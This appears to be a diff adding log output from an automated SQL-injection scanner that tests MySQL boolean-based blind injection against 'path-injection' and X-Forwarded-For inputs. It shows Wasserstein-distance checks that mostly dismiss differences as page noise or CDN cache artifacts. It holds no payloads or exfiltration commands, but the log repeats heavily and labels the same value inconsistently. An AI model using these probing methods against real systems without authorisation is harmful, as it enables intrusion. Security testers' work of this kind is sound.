+    [B-bool] [MySQL] 'path-injection' req#18 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#14)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#61)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#62)
+[*]    Wasserstein comparison probe (param='path-injection' req#19)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#63)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#64)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#42 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#43)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#65)
+    [B-bool] [MySQL] 'path-injection' req#16 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#20 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#66)
+[*]    Wasserstein comparison probe (param='path-injection' req#17)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#67)
+[*]    Wasserstein comparison probe (param='path-injection' req#21)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#68)
+    [B-bool] [MySQL] 'path-injection' req#16 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#45 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#46)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#69)
+[*]    Wasserstein comparison probe (param='path-injection' req#17)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#70)
+    [B-bool] [MySQL] 'path-injection' req#18 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#22 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#71)
+[*]    Wasserstein comparison probe (param='path-injection' req#19)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#72)
+[*]    Wasserstein comparison probe (param='path-injection' req#23)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#73)
+    [B-bool] [MySQL] 'path-injection' req#18 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#74)
+[*]    Wasserstein comparison probe (param='path-injection' req#19)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#75)
+    [B-bool] [MySQL] 'path-injection' req#20 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#24 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#76)
+[*]    Wasserstein comparison probe (param='path-injection' req#21)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#77)
+[*]    Wasserstein comparison probe (param='path-injection' req#25)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#78)
+    [B-bool] [MySQL] 'path-injection' req#20 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#50 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#51)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#79)
+[*]    Wasserstein comparison probe (param='path-injection' req#21)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#80)
+    [B-bool] [MySQL] 'path-injection' req#22 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#52 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#53)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#81)
+    [B-bool] [MySQL] 'path-injection' req#26 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#27)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#82)
+    [B-bool] [MySQL] 'path-injection' req#22 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#83)
+[*]    Wasserstein comparison probe (param='path-injection' req#23)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#84)
+    [B-bool] [MySQL] 'path-injection' req#28 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#29)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#85)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#86)
+    [B-bool] [MySQL] 'path-injection' req#13 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#24 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#87)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#56 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#57)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#88)
+[*]    Wasserstein comparison probe (param='path-injection' req#14)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#89)
+[*]    Wasserstein comparison probe (param='path-injection' req#25)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#90)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#58 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#91)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#92)
+    [B-bool] [MySQL] 'path-injection' req#31 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#32)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#93)
+    [B-bool] [MySQL] 'path-injection' req#26 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#60 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#61)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#94)
+[*]    Wasserstein comparison probe (param='path-injection' req#27)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#95)
+    [B-bool] [MySQL] 'path-injection' req#16 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#33 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#34)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#96)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#62 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#63)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#97)
+[*]    Wasserstein comparison probe (param='path-injection' req#17)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#98)
+    [B-bool] [MySQL] 'path-injection' req#28 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#29)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#99)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#64 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#65)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#100)
+    [B-bool] [MySQL] 'path-injection' req#35 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#18 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#101)
+[*]    Wasserstein comparison probe (param='path-injection' req#36)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#102)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#103)
+[*]    Wasserstein comparison probe (param='path-injection' req#19)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#104)
+    [B-bool] [MySQL] 'path-injection' req#31 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#67 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#68)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#105)
+    [B-bool] [MySQL] 'path-injection' req#37 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#38)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#106)
+[*]    Wasserstein comparison probe (param='path-injection' req#32)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#107)
+    [B-bool] [MySQL] 'path-injection' req#20 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#108)
+[*]    Wasserstein comparison probe (param='path-injection' req#23)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#109)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#110)
+[*]    Wasserstein comparison probe (param='path-injection' req#21)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#111)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#70 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#71)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#112)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#113)
+    [B-bool] [MySQL] 'path-injection' req#24 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#22 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#114)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#115)
+[*]    Wasserstein comparison probe (param='path-injection' req#25)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#116)
+[*]    Wasserstein comparison probe (param='path-injection' req#23)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#117)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#73 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#74)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#118)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#119)
+    [B-bool] [MySQL] 'path-injection' req#26 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#24 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#27)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#120)
+[*]    Wasserstein comparison probe (param='path-injection' req#25)
+[*]   [Wasserstein] dist=0.0000 CONSISTENT (range=0.0000 < 0.02 over 5 probes) -- page noise, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#121)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#75 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#76)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#122)
+    [B-bool] [MySQL] 'path-injection' req#43 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#44)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#123)
+    [B-bool] [MySQL] 'path-injection' req#28 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#29)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#124)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#77 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#78)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#125)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#126)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#127)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#128)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#129)
+    [B-bool] [MySQL] 'path-injection' req#31 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#80 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#81)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#130)
+[*]    Wasserstein comparison probe (param='path-injection' req#32)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#131)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#132)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#133)
+    [B-bool] [MySQL] 'path-injection' req#33 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#34)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#134)
+    [B-bool] [MySQL] 'path-injection' req#48 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#83 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#84)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#135)
+[*]    Wasserstein comparison probe (param='path-injection' req#49)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#136)
+    [B-bool] [MySQL] 'path-injection' req#35 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#137)
+[*]    Wasserstein comparison probe (param='path-injection' req#36)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#138)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#86 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#87)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#139)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#140)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#141)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#142)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#143)
+    [B-bool] [MySQL] 'path-injection' req#33 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#34)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#144)
+    [B-bool] [MySQL] 'path-injection' req#37 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#38)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#145)
+    [B-bool] [MySQL] 'path-injection' req#26 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#27)
+[*]   [Wasserstein] dist=0.6758 STABLE-PAGE OUTLIER (4/5 probes below 0.15, only 1 above threshold=0.30) -- CDN/cache miss, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#146)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#92 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#93)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#147)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#148)
+    [B-bool] [MySQL] 'path-injection' req#35 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#36)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#149)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#150)
+    [B-bool] [MySQL] 'path-injection' req#28 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#29)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#151)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#152)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#153)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#154)
+    [B-bool] [MySQL] 'path-injection' req#37 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#38)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#155)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#156)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#157)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#158)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#159)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#97 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#98)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#160)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#161)
+    [B-bool] [MySQL] 'path-injection' req#43 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#44)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#162)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#99 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#100)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#163)
+    [B-bool] [MySQL] 'path-injection' req#50 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#51)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#164)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#165)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#166)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#167)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#168)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#169)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#170)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#171)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#172)
+    [B-bool] [MySQL] 'path-injection' req#43 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#44)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#173)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#174)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#103 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#104)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#175)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#176)
+    [B-bool] [MySQL] 'path-injection' req#54 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#55)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#177)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#105 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#106)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#178)
+    [B-bool] [MySQL] 'path-injection' req#48 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#179)
+[*]    Wasserstein comparison probe (param='path-injection' req#49)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#180)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#181)
+    [B-bool] [MySQL] 'path-injection' req#56 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#182)
+[*]    Wasserstein comparison probe (param='path-injection' req#57)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#183)
+    [B-bool] [MySQL] 'path-injection' req#50 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#51)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#184)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#108 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#109)
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#185)
+    [B-bool] [MySQL] 'path-injection' req#48 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#186)
+    [B-bool] [MySQL] 'path-injection' req#58 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'X-Forwarded-For' req#110 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#111)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#187)
+[*]    Wasserstein comparison probe (param='path-injection' req#49)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#188)
+[*]    Wasserstein comparison probe (param='path-injection' req#59)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#189)
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#190)
+    [B-bool] [MySQL] 'X-Forwarded-For' req#112 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#113)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (3 near-zero + 2 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='X-Forwarded-For' req#191)
+    [B-bool] [MySQL] 'path-injection' req#31 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [MySQL] 'path-injection' req#50 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#51)
+[*]   [Wasserstein] dist=0.6758 BIMODAL OUTLIER (2 near-zero + 3 above-threshold in 5-probe window) -- CDN cache transition artifact, NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='path-injection' req#192)
+    [B-bool] [MySQL] 'path-injection' req#60 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#61)
